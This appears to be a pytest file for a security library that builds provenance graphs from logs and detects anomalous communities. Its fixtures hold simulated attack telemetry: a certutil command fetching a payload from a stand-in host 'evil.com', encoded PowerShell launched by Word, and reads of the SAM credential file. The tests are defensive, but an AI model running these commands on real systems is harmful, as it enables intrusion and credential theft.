"""Tests for provenance graph construction, Louvain community detection,
anomalous community detection, and graph context formatting."""

import json

import pytest

from nabla.provenance import (
    ProvenanceGraph,
    build_from_entries,
    prune_benign_nodes,
    louvain_communities,
    detect_anomalous_communities,
    detect_provenance_anomalies,
    detect_provenance_anomalies_with_context,
    format_provenance_summary,
    NODE_PROCESS,
    NODE_FILE,
    NODE_IP,
    NODE_USER,
    NODE_HOST,
    NODE_REGISTRY,
    NODE_DOMAIN,
    EDGE_PARENT_OF,
    EDGE_EXECUTED_ON,
    EDGE_CONNECTED_TO,
    EDGE_LOGGED_IN_AS,
    EDGE_QUERIED,
    EDGE_CREATED,
    EDGE_READ,
    EDGE_WROTE,
    BENIGN_PROCESSES,
    DEFAULT_PROVENANCE_THRESHOLDS,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def auth_entries():
    """Sample auth log entries."""
    return [
        {"timestamp": "2025-01-01T08:00:00", "type": "auth", "user": "jsmith",
         "source_ip": "10.0.1.50", "action": "login_success", "dest_host": "WORKSTATION-01"},
        {"timestamp": "2025-01-01T08:05:00", "type": "auth", "user": "admin",
         "source_ip": "10.0.1.100", "action": "login_failure", "dest_host": "SERVER-DC01"},
        {"timestamp": "2025-01-01T08:10:00", "type": "auth", "user": "jsmith",
         "source_ip": "10.0.1.50", "action": "privilege_escalation", "dest_host": "WORKSTATION-01"},
    ]


@pytest.fixture
def network_entries():
    """Sample network log entries."""
    return [
        {"timestamp": "2025-01-01T08:00:00", "type": "network", "src_ip": "10.0.1.50",
         "dst_ip": "192.168.1.15", "port": 443, "protocol": "TCP"},
        {"timestamp": "2025-01-01T08:05:00", "type": "network", "src_ip": "10.0.1.100",
         "dst_ip": "203.0.113.50", "port": 8443, "protocol": "TCP"},
    ]


@pytest.fixture
def dns_entries():
    """Sample DNS log entries."""
    return [
        {"timestamp": "2025-01-01T08:00:00", "type": "dns", "client_ip": "10.0.1.50",
         "domain": "c2-beacon.bad", "query_type": "A"},
        {"timestamp": "2025-01-01T08:05:00", "type": "dns", "client_ip": "10.0.1.100",
         "domain": "example.com", "query_type": "A"},
    ]


@pytest.fixture
def endpoint_entries():
    """Sample endpoint log entries with provenance fields."""
    return [
        {"timestamp": "2025-01-01T08:00:00", "type": "endpoint", "host": "WORKSTATION-01",
         "process": "powershell.exe", "user": "jsmith", "source_ip": "10.0.1.50",
         "action": "execute", "command_line": "powershell -enc ...",
         "parent_process": "winword.exe",
         "target_file": "C:\\Windows\\System32\\config\\SAM"},
        {"timestamp": "2025-01-01T08:05:00", "type": "endpoint", "host": "SERVER-DC01",
         "process": "svchost.exe", "user": "system", "source_ip": "10.0.0.1",
         "action": "execute", "command_line": "svchost.exe -k netsvcs",
         "parent_process": "services.exe"},
        {"timestamp": "2025-01-01T08:10:00", "type": "endpoint", "host": "WORKSTATION-01",
         "process": "certutil.exe", "user": "jsmith", "source_ip": "10.0.1.50",
         "action": "create", "command_line": "certutil -urlcache -f http://evil.com/payload",
         "parent_process": "cmd.exe",
         "network_connection": "203.0.113.50:443"},
    ]


@pytest.fixture
def mixed_entries(auth_entries, network_entries, dns_entries, endpoint_entries):
    """All log types combined."""
    return auth_entries + network_entries + dns_entries + endpoint_entries


@pytest.fixture
def sample_anomalies():
    """Anomalies matching some of the mixed entries."""
    return [
        {"type": "suspicious_parent_child", "user": "jsmith", "host": "WORKSTATION-01",
         "process": "powershell.exe", "source_ip": "10.0.1.50", "detection_method": "parent_child"},
        {"type": "lolbin_abuse", "user": "jsmith", "host": "WORKSTATION-01",
         "process": "certutil.exe", "source_ip": "10.0.1.50", "detection_method": "lolbin"},
    ]


# ---------------------------------------------------------------------------
# ProvenanceGraph class tests
# ---------------------------------------------------------------------------

class TestProvenanceGraph:
    def test_add_node(self):
        g = ProvenanceGraph()
        node = g.add_node(NODE_PROCESS, "powershell.exe")
        assert node == (NODE_PROCESS, "powershell.exe")
        assert node in g.nodes

    def test_add_node_case_insensitive(self):
        g = ProvenanceGraph()
        n1 = g.add_node(NODE_PROCESS, "PowerShell.exe")
        n2 = g.add_node(NODE_PROCESS, "powershell.exe")
        assert n1 == n2
        assert len(g.nodes) == 1

    def test_add_node_empty_name_skipped(self):
        g = ProvenanceGraph()
        g.add_node(NODE_PROCESS, "")
        assert len(g.nodes) == 0

    def test_add_edge(self):
        g = ProvenanceGraph()
        a = g.add_node(NODE_PROCESS, "cmd.exe")
        b = g.add_node(NODE_PROCESS, "powershell.exe")
        g.add_edge(a, b, EDGE_PARENT_OF)
        assert g.degree(a) == 1
        assert g.degree(b) == 1

    def test_add_edge_undirected(self):
        g = ProvenanceGraph()
        a = g.add_node(NODE_PROCESS, "cmd.exe")
        b = g.add_node(NODE_HOST, "SERVER-DC01")
        g.add_edge(a, b, EDGE_EXECUTED_ON)
        # Both directions should exist
        neighbors_a = [n for n, _ in g.neighbors(a)]
        neighbors_b = [n for n, _ in g.neighbors(b)]
        assert b in neighbors_a
        assert a in neighbors_b

    def test_add_edge_self_loop_skipped(self):
        g = ProvenanceGraph()
        a = g.add_node(NODE_PROCESS, "cmd.exe")
        g.add_edge(a, a, EDGE_PARENT_OF)
        assert g.degree(a) == 0

    def test_node_count(self):
        g = ProvenanceGraph()
        g.add_node(NODE_PROCESS, "a")
        g.add_node(NODE_PROCESS, "b")
        g.add_node(NODE_IP, "10.0.0.1")
        assert g.node_count() == 3

    def test_edge_count(self):
        g = ProvenanceGraph()
        a = g.add_node(NODE_PROCESS, "a")
        b = g.add_node(NODE_HOST, "h1")
        c = g.add_node(NODE_IP, "10.0.0.1")
        g.add_edge(a, b, EDGE_EXECUTED_ON)
        g.add_edge(b, c, EDGE_CONNECTED_TO)
        assert g.edge_count() == 2


# ---------------------------------------------------------------------------
# build_from_entries tests
# ---------------------------------------------------------------------------

class TestBuildFromEntries:
    def test_auth_nodes(self, auth_entries):
        g = build_from_entries(auth_entries)
        assert (NODE_USER, "jsmith") in g.nodes
        assert (NODE_USER, "admin") in g.nodes
        assert (NODE_IP, "10.0.1.50") in g.nodes
        assert (NODE_HOST, "workstation-01") in g.nodes

    def test_auth_edges(self, auth_entries):
        g = build_from_entries(auth_entries)
        user_node = (NODE_USER, "jsmith")
        ip_node = (NODE_IP, "10.0.1.50")
        neighbors = [n for n, _ in g.neighbors(user_node)]
        assert ip_node in neighbors

    def test_network_nodes(self, network_entries):
        g = build_from_entries(network_entries)
        assert (NODE_IP, "10.0.1.50") in g.nodes
        assert (NODE_IP, "192.168.1.15") in g.nodes

    def test_network_edges(self, network_entries):
        g = build_from_entries(network_entries)
        src = (NODE_IP, "10.0.1.50")
        dst = (NODE_IP, "192.168.1.15")
        neighbors = [n for n, _ in g.neighbors(src)]
        assert dst in neighbors

    def test_dns_nodes(self, dns_entries):
        g = build_from_entries(dns_entries)
        assert (NODE_IP, "10.0.1.50") in g.nodes
        assert (NODE_DOMAIN, "c2-beacon.bad") in g.nodes

    def test_dns_edges(self, dns_entries):
        g = build_from_entries(dns_entries)
        ip = (NODE_IP, "10.0.1.50")
        domain = (NODE_DOMAIN, "c2-beacon.bad")
        neighbors = [n for n, _ in g.neighbors(ip)]
        assert domain in neighbors

    def test_endpoint_nodes(self, endpoint_entries):
        g = build_from_entries(endpoint_entries)
        assert (NODE_PROCESS, "powershell") in g.nodes
        assert (NODE_PROCESS, "svchost") in g.nodes
        assert (NODE_HOST, "workstation-01") in g.nodes
        assert (NODE_FILE, "c:\\windows\\system32\\config\\sam") in g.nodes

    def test_endpoint_parent_child_edge(self, endpoint_entries):
        g = build_from_entries(endpoint_entries)
        parent = (NODE_PROCESS, "winword")
        child = (NODE_PROCESS, "powershell")
        neighbors = [n for n, _ in g.neighbors(parent)]
        assert child in neighbors

    def test_endpoint_file_edge(self, endpoint_entries):
        g = build_from_entries(endpoint_entries)
        proc = (NODE_PROCESS, "powershell")
        file_node = (NODE_FILE, "c:\\windows\\system32\\config\\sam")
        neighbors = [n for n, _ in g.neighbors(proc)]
        assert file_node in neighbors

    def test_endpoint_network_edge(self, endpoint_entries):
        g = build_from_entries(endpoint_entries)
        proc = (NODE_PROCESS, "certutil")
        net = (NODE_IP, "203.0.113.50:443")
        neighbors = [n for n, _ in g.neighbors(proc)]
        assert net in neighbors

    def test_anomaly_marking(self, endpoint_entries, sample_anomalies):
        g = build_from_entries(endpoint_entries, sample_anomalies)
        assert (NODE_PROCESS, "powershell") in g.node_anomaly
        assert (NODE_PROCESS, "certutil") in g.node_anomaly
        # svchost is not anomalous
        assert (NODE_PROCESS, "svchost") not in g.node_anomaly

    def test_mixed_entries(self, mixed_entries):
        g = build_from_entries(mixed_entries)
        # Should have nodes from all 4 log types
        node_types = set(n[0] for n in g.nodes)
        assert NODE_PROCESS in node_types
        assert NODE_IP in node_types
        assert NODE_USER in node_types
        assert NODE_HOST in node_types

    def test_empty_entries(self):
        g = build_from_entries([])
        assert g.node_count() == 0
        assert g.edge_count() == 0


# ---------------------------------------------------------------------------
# Benign pruning tests
# ---------------------------------------------------------------------------

class TestPruneBenignNodes:
    def test_prune_system_processes(self, endpoint_entries):
        g = build_from_entries(endpoint_entries)
        pruned = prune_benign_nodes(g)
        # svchost should be pruned (benign, no anomalous neighbors)
        # Note: process names are stored without .exe suffix
        assert (NODE_PROCESS, "svchost") not in pruned.nodes

    def test_keep_anomalous_processes(self, endpoint_entries, sample_anomalies):
        g = build_from_entries(endpoint_entries, sample_anomalies)
        pruned = prune_benign_nodes(g)
        # powershell is anomalous — should be kept
        assert (NODE_PROCESS, "powershell") in pruned.nodes

    def test_keep_non_process_nodes(self, endpoint_entries):
        g = build_from_entries(endpoint_entries)
        pruned = prune_benign_nodes(g)
        # IP and host nodes should always be kept (host names are lowercased)
        assert (NODE_HOST, "workstation-01") in pruned.nodes

    def test_keep_benign_with_anomalous_neighbor(self, endpoint_entries, sample_anomalies):
        g = build_from_entries(endpoint_entries, sample_anomalies)
        pruned = prune_benign_nodes(g)
        # services.exe is benign but is parent of svchost which is benign
        # However, cmd.exe is parent of certutil which is anomalous
        # So cmd.exe should be kept (has anomalous neighbor certutil)
        assert (NODE_PROCESS, "cmd") in pruned.nodes

    def test_remove_isolated_nodes(self, auth_entries):
        g = build_from_entries(auth_entries)
        pruned = prune_benign_nodes(g)
        # Any node with degree 0 and not anomalous should be removed
        for node in pruned.nodes:
            if node not in pruned.node_anomaly:
                assert pruned.degree(node) > 0 or node in pruned.nodes

    def test_prune_empty_graph(self):
        g = ProvenanceGraph()
        pruned = prune_benign_nodes(g)
        assert pruned.node_count() == 0


# ---------------------------------------------------------------------------
# Louvain community detection tests
# ---------------------------------------------------------------------------

class TestLouvainCommunities:
    def test_single_node(self):
        g = ProvenanceGraph()
        g.add_node(NODE_PROCESS, "a")
        result = louvain_communities(g)
        assert len(result) == 1
        assert result[(NODE_PROCESS, "a")] == 0

    def test_empty_graph(self):
        g = ProvenanceGraph()
        result = louvain_communities(g)
        assert result == {}

    def test_two_connected_nodes_same_community(self):
        g = ProvenanceGraph()
        a = g.add_node(NODE_PROCESS, "a")
        b = g.add_node(NODE_HOST, "h1")
        g.add_edge(a, b, EDGE_EXECUTED_ON)
        result = louvain_communities(g)
        # Two connected nodes should be in the same community
        assert result[a] == result[b]

    def test_disconnected_nodes_different_communities(self):
        g = ProvenanceGraph()
        a = g.add_node(NODE_PROCESS, "a")
        b = g.add_node(NODE_PROCESS, "b")
        # No edges — each in own community initially
        # But with no edges, m=0, so all go to community 0
        result = louvain_communities(g)
        # With no edges, fallback to single community
        assert len(set(result.values())) == 1

    def test_two_clusters(self):
        """Two dense clusters connected by a single bridge edge."""
        g = ProvenanceGraph()
        # Cluster 1: processes on host1
        p1 = g.add_node(NODE_PROCESS, "proc1")
        p2 = g.add_node(NODE_PROCESS, "proc2")
        h1 = g.add_node(NODE_HOST, "HOST1")
        g.add_edge(p1, h1, EDGE_EXECUTED_ON)
        g.add_edge(p2, h1, EDGE_EXECUTED_ON)
        g.add_edge(p1, p2, EDGE_PARENT_OF)

        # Cluster 2: processes on host2
        p3 = g.add_node(NODE_PROCESS, "proc3")
        p4 = g.add_node(NODE_PROCESS, "proc4")
        h2 = g.add_node(NODE_HOST, "HOST2")
        g.add_edge(p3, h2, EDGE_EXECUTED_ON)
        g.add_edge(p4, h2, EDGE_EXECUTED_ON)
        g.add_edge(p3, p4, EDGE_PARENT_OF)

        # Bridge: IP connects to both hosts
        ip = g.add_node(NODE_IP, "10.0.0.1")
        g.add_edge(ip, h1, EDGE_CONNECTED_TO)
        g.add_edge(ip, h2, EDGE_CONNECTED_TO)

        result = louvain_communities(g)
        # Should detect at least 2 communities
        n_communities = len(set(result.values()))
        assert n_communities >= 2

    def test_community_ids_are_sequential(self):
        g = ProvenanceGraph()
        a = g.add_node(NODE_PROCESS, "a")
        b = g.add_node(NODE_HOST, "h1")
        g.add_edge(a, b, EDGE_EXECUTED_ON)
        result = louvain_communities(g)
        community_ids = set(result.values())
        assert min(community_ids) == 0
        assert max(community_ids) == len(community_ids) - 1


# ---------------------------------------------------------------------------
# Anomalous community detection tests
# ---------------------------------------------------------------------------

class TestDetectAnomalousCommunities:
    def test_no_communities(self):
        g = ProvenanceGraph()
        result = detect_anomalous_communities(g, {})
        assert result == []

    def test_high_density_community_flagged(self):
        """Community with >30% anomalous nodes should be flagged."""
        g = ProvenanceGraph()
        # Create a community of 4 nodes, 2 anomalous (50% density)
        p1 = g.add_node(NODE_PROCESS, "malware1")
        p2 = g.add_node(NODE_PROCESS, "malware2")
        h = g.add_node(NODE_HOST, "HOST1")
        u = g.add_node(NODE_USER, "attacker")
        g.add_edge(p1, h, EDGE_EXECUTED_ON)
        g.add_edge(p2, h, EDGE_EXECUTED_ON)
        g.add_edge(p1, u, EDGE_LOGGED_IN_AS)
        g.add_edge(p2, u, EDGE_LOGGED_IN_AS)
        g.node_anomaly = {p1, p2}

        # Force all nodes into one community
        communities = {p1: 0, p2: 0, h: 0, u: 0}
        result = detect_anomalous_communities(g, communities)
        assert len(result) == 1
        assert result[0]["detection_method"] == "provenance_community"
        assert result[0]["anomaly_density"] == 0.5

    def test_low_density_community_not_flagged(self):
        """Community with <10% anomalous nodes should not be flagged."""
        g = ProvenanceGraph()
        nodes = []
        for i in range(10):
            n = g.add_node(NODE_PROCESS, f"proc{i}")
            nodes.append(n)
        # Connect all to a central host
        h = g.add_node(NODE_HOST, "HOST1")
        for n in nodes:
            g.add_edge(n, h, EDGE_EXECUTED_ON)
        # Only 1 anomalous out of 11 (9%)
        g.node_anomaly = {nodes[0]}

        communities = {n: 0 for n in nodes}
        communities[h] = 0
        result = detect_anomalous_communities(g, communities)
        assert len(result) == 0

    def test_cross_type_cluster_flagged(self):
        """Community with 3+ node types and moderate density should be flagged."""
        g = ProvenanceGraph()
        p = g.add_node(NODE_PROCESS, "suspicious")
        h = g.add_node(NODE_HOST, "HOST1")
        ip = g.add_node(NODE_IP, "10.0.0.1")
        u = g.add_node(NODE_USER, "attacker")
        g.add_edge(p, h, EDGE_EXECUTED_ON)
        g.add_edge(p, ip, EDGE_CONNECTED_TO)
        g.add_edge(p, u, EDGE_LOGGED_IN_AS)
        g.node_anomaly = {p}  # 25% density, but 4 types

        communities = {p: 0, h: 0, ip: 0, u: 0}
        result = detect_anomalous_communities(g, communities, {
            "provenance_anomaly_density": 0.3,
            "provenance_min_community_size": 3,
        })
        assert len(result) == 1
        assert result[0]["type_diversity"] == 4

    def test_small_community_not_flagged(self):
        """Community below min_community_size should be skipped."""
        g = ProvenanceGraph()
        p = g.add_node(NODE_PROCESS, "a")
        h = g.add_node(NODE_HOST, "HOST1")
        g.add_edge(p, h, EDGE_EXECUTED_ON)
        g.node_anomaly = {p}

        communities = {p: 0, h: 0}
        result = detect_anomalous_communities(g, communities, {
            "provenance_min_community_size": 3,
        })
        assert len(result) == 0

    def test_severity_high_for_dense(self):
        """Community with >50% anomaly density gets high severity."""
        g = ProvenanceGraph()
        p1 = g.add_node(NODE_PROCESS, "a")
        p2 = g.add_node(NODE_PROCESS, "b")
        h = g.add_node(NODE_HOST, "HOST1")
        g.add_edge(p1, h, EDGE_EXECUTED_ON)
        g.add_edge(p2, h, EDGE_EXECUTED_ON)
        g.node_anomaly = {p1, p2}  # 66% density

        communities = {p1: 0, p2: 0, h: 0}
        result = detect_anomalous_communities(g, communities)
        assert len(result) == 1
        assert result[0]["severity"] == "high"

    def test_custom_thresholds(self):
        """Higher density threshold should filter more communities."""
        g = ProvenanceGraph()
        p = g.add_node(NODE_PROCESS, "a")
        h = g.add_node(NODE_HOST, "HOST1")
        u = g.add_node(NODE_USER, "user1")
        g.add_edge(p, h, EDGE_EXECUTED_ON)
        g.add_edge(p, u, EDGE_LOGGED_IN_AS)
        g.node_anomaly = {p}  # 33% density

        communities = {p: 0, h: 0, u: 0}
        # With default threshold (0.3), flagged
        result_default = detect_anomalous_communities(g, communities)
        # With high threshold (0.5), not flagged
        result_high = detect_anomalous_communities(g, communities, {
            "provenance_anomaly_density": 0.5,
        })
        assert len(result_default) >= len(result_high)


# ---------------------------------------------------------------------------
# Top-level detect_provenance_anomalies tests
# ---------------------------------------------------------------------------

class TestDetectProvenanceAnomalies:
    def test_too_few_entries(self):
        result = detect_provenance_anomalies([], [])
        assert result == []

    def test_two_entries(self):
        entries = [
            {"type": "auth", "user": "a", "source_ip": "10.0.0.1", "action": "login_success"},
            {"type": "auth", "user": "b", "source_ip": "10.0.0.2", "action": "login_success"},
        ]
        result = detect_provenance_anomalies(entries, [])
        assert result == []

    def test_attack_scenario_detection(self):
        """Simulated attack scenario should produce anomalous communities."""
        entries = [
            # Auth: brute force
            {"timestamp": "2025-01-01T02:00:00", "type": "auth", "user": "attacker",
             "source_ip": "203.0.113.50", "action": "login_failure", "dest_host": "SERVER-DC01"},
            {"timestamp": "2025-01-01T02:01:00", "type": "auth", "user": "attacker",
             "source_ip": "203.0.113.50", "action": "login_success", "dest_host": "SERVER-DC01"},
            # Endpoint: LOLBIN
            {"timestamp": "2025-01-01T02:05:00", "type": "endpoint", "host": "SERVER-DC01",
             "process": "certutil.exe", "user": "attacker", "source_ip": "203.0.113.50",
             "action": "create", "parent_process": "cmd.exe",
             "target_file": "C:\\temp\\payload.bat",
             "network_connection": "198.51.100.10:443"},
            # Network: C2
            {"timestamp": "2025-01-01T02:10:00", "type": "network", "src_ip": "203.0.113.50",
             "dst_ip": "198.51.100.10", "port": 443, "protocol": "TCP"},
            # DNS: suspicious domain
            {"timestamp": "2025-01-01T02:15:00", "type": "dns", "client_ip": "203.0.113.50",
             "domain": "c2-beacon.bad", "query_type": "A"},
        ]
        anomalies = [
            {"type": "lolbin_abuse", "user": "attacker", "process": "certutil.exe",
             "source_ip": "203.0.113.50", "detection_method": "lolbin"},
        ]
        result = detect_provenance_anomalies(entries, anomalies)
        # Should detect at least one anomalous community
        assert len(result) >= 1
        assert result[0]["detection_method"] == "provenance_community"

    def test_all_benign_no_flagging(self):
        """Normal activity should not produce anomalous communities."""
        entries = [
            {"timestamp": "2025-01-01T09:00:00", "type": "auth", "user": "jsmith",
             "source_ip": "10.0.1.50", "action": "login_success", "dest_host": "WORKSTATION-01"},
            {"timestamp": "2025-01-01T09:05:00", "type": "auth", "user": "admin",
             "source_ip": "10.0.1.100", "action": "login_success", "dest_host": "SERVER-DC01"},
            {"timestamp": "2025-01-01T09:10:00", "type": "endpoint", "host": "WORKSTATION-01",
             "process": "explorer.exe", "user": "jsmith", "source_ip": "10.0.1.50",
             "action": "execute", "parent_process": "winlogon.exe"},
            {"timestamp": "2025-01-01T09:15:00", "type": "network", "src_ip": "10.0.1.50",
             "dst_ip": "10.0.1.100", "port": 443, "protocol": "TCP"},
        ]
        result = detect_provenance_anomalies(entries, [])
        # No anomalies in the input, so no anomalous communities
        assert len(result) == 0


# ---------------------------------------------------------------------------
# Integration with RL thresholds
# ---------------------------------------------------------------------------

class TestRLIntegration:
    def test_provenance_thresholds_in_defaults(self):
        """Provenance thresholds should be in DEFAULT_THRESHOLDS."""
        from nabla.detection import DEFAULT_THRESHOLDS
        assert "provenance_anomaly_density" in DEFAULT_THRESHOLDS
        assert "provenance_min_community_size" in DEFAULT_THRESHOLDS

    def test_provenance_thresholds_in_calibration(self):
        """Provenance thresholds should be in the calibration THRESHOLDS."""
        from nabla.rl.calibration import THRESHOLDS
        assert "provenance_anomaly_density" in THRESHOLDS
        assert "provenance_min_community_size" in THRESHOLDS

    def test_provenance_in_bandit_methods(self):
        """provenance_community should be in bandit DETECTION_METHODS."""
        from nabla.rl.bandit import DETECTION_METHODS
        assert "provenance_community" in DETECTION_METHODS

    def test_provenance_thresholds_in_calibration_store(self, tmp_path, monkeypatch):
        """Provenance thresholds should be in the calibration store defaults."""
        from nabla.rl import calibration
        monkeypatch.setattr(calibration, "calibration_store_path", lambda: tmp_path / "cal.json")
        vals = calibration.effective_thresholds()
        assert "provenance_anomaly_density" in vals
        assert "provenance_min_community_size" in vals


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------

class TestEdgeCases:
    def test_registry_node(self):
        """Registry key should create a registry node."""
        entries = [
            {"timestamp": "2025-01-01T08:00:00", "type": "endpoint", "host": "HOST1",
             "process": "reg.exe", "user": "admin", "source_ip": "10.0.0.1",
             "action": "modify", "parent_process": "cmd.exe",
             "target_registry": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"},
        ]
        g = build_from_entries(entries)
        assert (NODE_REGISTRY, "hklm\\software\\microsoft\\windows\\currentversion\\run") in g.nodes

    def test_endpoint_action_create_edge(self):
        """Action 'create' should create a CREATED edge."""
        entries = [
            {"timestamp": "2025-01-01T08:00:00", "type": "endpoint", "host": "HOST1",
             "process": "cmd.exe", "user": "admin", "source_ip": "10.0.0.1",
             "action": "create", "parent_process": "explorer.exe",
             "target_file": "C:\\temp\\payload.bat"},
        ]
        g = build_from_entries(entries)
        proc = (NODE_PROCESS, "cmd")
        file_node = (NODE_FILE, "c:\\temp\\payload.bat")
        edge_types = [et for n, et in g.neighbors(proc) if n == file_node]
        assert EDGE_CREATED in edge_types

    def test_endpoint_action_delete_edge(self):
        """Action 'delete' should create a WROTE edge."""
        entries = [
            {"timestamp": "2025-01-01T08:00:00", "type": "endpoint", "host": "HOST1",
             "process": "cmd.exe", "user": "admin", "source_ip": "10.0.0.1",
             "action": "delete", "parent_process": "explorer.exe",
             "target_file": "C:\\temp\\payload.bat"},
        ]
        g = build_from_entries(entries)
        proc = (NODE_PROCESS, "cmd")
        file_node = (NODE_FILE, "c:\\temp\\payload.bat")
        edge_types = [et for n, et in g.neighbors(proc) if n == file_node]
        assert EDGE_WROTE in edge_types

    def test_benign_processes_list(self):
        """BENIGN_PROCESSES should contain common system processes (without .exe)."""
        assert "explorer" in BENIGN_PROCESSES
        assert "svchost" in BENIGN_PROCESSES
        assert "systemd" in BENIGN_PROCESSES

    def test_default_thresholds(self):
        """Default thresholds should have reasonable values."""
        assert DEFAULT_PROVENANCE_THRESHOLDS["provenance_anomaly_density"] == 0.3
        assert DEFAULT_PROVENANCE_THRESHOLDS["provenance_min_community_size"] == 3


# ---------------------------------------------------------------------------
# Tests for detect_provenance_anomalies_with_context
# ---------------------------------------------------------------------------

class TestDetectWithContext:
    """Tests for detect_provenance_anomalies_with_context returning graph objects."""

    def test_returns_tuple(self):
        """detect_provenance_anomalies_with_context returns (anomalies, graph, communities)."""
        entries = [
            {"type": "endpoint", "action": "execute", "process": "powershell",
             "parent_process": "cmd", "host": "ws1", "timestamp": "2025-01-01T00:00:00Z"},
            {"type": "auth", "action": "login_success", "user": "admin",
             "source_ip": "10.0.1.50", "host": "ws1", "timestamp": "2025-01-01T00:01:00Z"},
            {"type": "network", "action": "connect", "source_ip": "10.0.1.50",
             "destination_ip": "192.168.1.1", "host": "ws1", "timestamp": "2025-01-01T00:02:00Z"},
        ]
        anomalies = [{"type": "test", "source_ip": "10.0.1.50", "host": "ws1"}]
        result = detect_provenance_anomalies_with_context(entries, anomalies)
        assert isinstance(result, tuple)
        assert len(result) == 3
        anomalies_out, graph, communities = result
        assert isinstance(anomalies_out, list)
        # graph and communities should be ProvenanceGraph and dict (or None)
        if graph is not None:
            assert isinstance(graph, ProvenanceGraph)
        if communities is not None:
            assert isinstance(communities, dict)

    def test_too_few_entries_returns_none(self):
        """With fewer than 3 entries, returns empty anomalies and None graph/communities."""
        result = detect_provenance_anomalies_with_context(
            [{"type": "auth", "action": "login"}],
            [],
        )
        assert result == ([], None, None)

    def test_detect_provenance_anomalies_still_works(self):
        """detect_provenance_anomalies (without context) still returns just the list."""
        entries = [
            {"type": "endpoint", "action": "execute", "process": "powershell",
             "parent_process": "cmd", "host": "ws1", "timestamp": "2025-01-01T00:00:00Z"},
            {"type": "auth", "action": "login_success", "user": "admin",
             "source_ip": "10.0.1.50", "host": "ws1", "timestamp": "2025-01-01T00:01:00Z"},
            {"type": "network", "action": "connect", "source_ip": "10.0.1.50",
             "destination_ip": "192.168.1.1", "host": "ws1", "timestamp": "2025-01-01T00:02:00Z"},
        ]
        anomalies = [{"type": "test", "source_ip": "10.0.1.50", "host": "ws1"}]
        result = detect_provenance_anomalies(entries, anomalies)
        assert isinstance(result, list)


# ---------------------------------------------------------------------------
# Tests for format_provenance_summary
# ---------------------------------------------------------------------------

class TestFormatProvenanceSummary:
    """Tests for format_provenance_summary producing block text."""

    def _make_graph(self):
        """Build a small test graph with 2 communities."""
        graph = ProvenanceGraph()
        # Community 0: process + ip + user
        graph.add_node(NODE_PROCESS, "powershell")
        graph.add_node(NODE_IP, "10.0.1.50")
        graph.add_node(NODE_USER, "admin")
        graph.add_edge((NODE_PROCESS, "powershell"), (NODE_IP, "10.0.1.50"), EDGE_EXECUTED_ON)
        graph.add_edge((NODE_IP, "10.0.1.50"), (NODE_USER, "admin"), EDGE_LOGGED_IN_AS)
        # Mark two as anomalous
        graph.node_anomaly.add((NODE_PROCESS, "powershell"))
        graph.node_anomaly.add((NODE_IP, "10.0.1.50"))

        # Community 1: ip + domain
        graph.add_node(NODE_IP, "192.168.1.1")
        graph.add_node(NODE_DOMAIN, "evil.com")
        graph.add_edge((NODE_IP, "192.168.1.1"), (NODE_DOMAIN, "evil.com"), EDGE_CONNECTED_TO)

        return graph

    def test_empty_communities(self):
        """Empty communities dict returns no-communities message."""
        graph = ProvenanceGraph()
        result = format_provenance_summary(graph, {}, [])
        assert "no communities" in result.lower()

    def test_human_readable_output(self):
        """Output includes human-readable community summaries."""
        graph = self._make_graph()
        communities = {
            (NODE_PROCESS, "powershell"): 0,
            (NODE_IP, "10.0.1.50"): 0,
            (NODE_USER, "admin"): 0,
            (NODE_IP, "192.168.1.1"): 1,
            (NODE_DOMAIN, "evil.com"): 1,
        }
        result = format_provenance_summary(graph, communities, [])
        assert "Community 0" in result
        assert "Community 1" in result
        assert "anomalous" in result.lower()

    def test_json_line_present(self):
        """Output includes a JSON: line with structured community data."""
        graph = self._make_graph()
        communities = {
            (NODE_PROCESS, "powershell"): 0,
            (NODE_IP, "10.0.1.50"): 0,
            (NODE_USER, "admin"): 0,
            (NODE_IP, "192.168.1.1"): 1,
            (NODE_DOMAIN, "evil.com"): 1,
        }
        # Flag community 0 so it appears in the JSON output
        provenance_anomalies = [{"community_id": 0}]
        result = format_provenance_summary(graph, communities, provenance_anomalies)
        json_lines = [l for l in result.split("\n") if l.startswith("JSON:")]
        assert len(json_lines) == 1
        data = json.loads(json_lines[0][5:])
        assert "communities" in data
        # Only flagged communities appear in JSON
        assert len(data["communities"]) == 1
        assert data["communities"][0]["id"] == 0

    def test_json_community_fields(self):
        """JSON community entries have required fields."""
        graph = self._make_graph()
        communities = {
            (NODE_PROCESS, "powershell"): 0,
            (NODE_IP, "10.0.1.50"): 0,
            (NODE_USER, "admin"): 0,
            (NODE_IP, "192.168.1.1"): 1,
            (NODE_DOMAIN, "evil.com"): 1,
        }
        provenance_anomalies = [{"community_id": 0}]
        result = format_provenance_summary(graph, communities, provenance_anomalies)
        json_lines = [l for l in result.split("\n") if l.startswith("JSON:")]
        data = json.loads(json_lines[0][5:])
        comm = data["communities"][0]
        assert "id" in comm
        assert "size" in comm
        assert "anomaly_density" in comm
        assert "types" in comm
        assert "members" in comm
        assert "anomalous" in comm
        assert "flagged" in comm

    def test_anomaly_density_calculation(self):
        """Anomaly density is correctly computed."""
        graph = self._make_graph()
        communities = {
            (NODE_PROCESS, "powershell"): 0,
            (NODE_IP, "10.0.1.50"): 0,
            (NODE_USER, "admin"): 0,
            (NODE_IP, "192.168.1.1"): 1,
            (NODE_DOMAIN, "evil.com"): 1,
        }
        # Flag both communities so both appear in JSON
        provenance_anomalies = [{"community_id": 0}, {"community_id": 1}]
        result = format_provenance_summary(graph, communities, provenance_anomalies)
        json_lines = [l for l in result.split("\n") if l.startswith("JSON:")]
        data = json.loads(json_lines[0][5:])
        # Community 0: 3 nodes, 2 anomalous → density 0.667
        comm0 = [c for c in data["communities"] if c["id"] == 0][0]
        assert abs(comm0["anomaly_density"] - 0.667) < 0.01
        # Community 1: 2 nodes, 0 anomalous → density 0.0
        comm1 = [c for c in data["communities"] if c["id"] == 1][0]
        assert comm1["anomaly_density"] == 0.0

    def test_flagged_community_from_anomalies(self):
        """Flagged status is set when community appears in provenance_anomalies."""
        graph = self._make_graph()
        communities = {
            (NODE_PROCESS, "powershell"): 0,
            (NODE_IP, "10.0.1.50"): 0,
            (NODE_USER, "admin"): 0,
            (NODE_IP, "192.168.1.1"): 1,
            (NODE_DOMAIN, "evil.com"): 1,
        }
        provenance_anomalies = [{"community_id": 0, "type": "provenance_community"}]
        result = format_provenance_summary(graph, communities, provenance_anomalies)
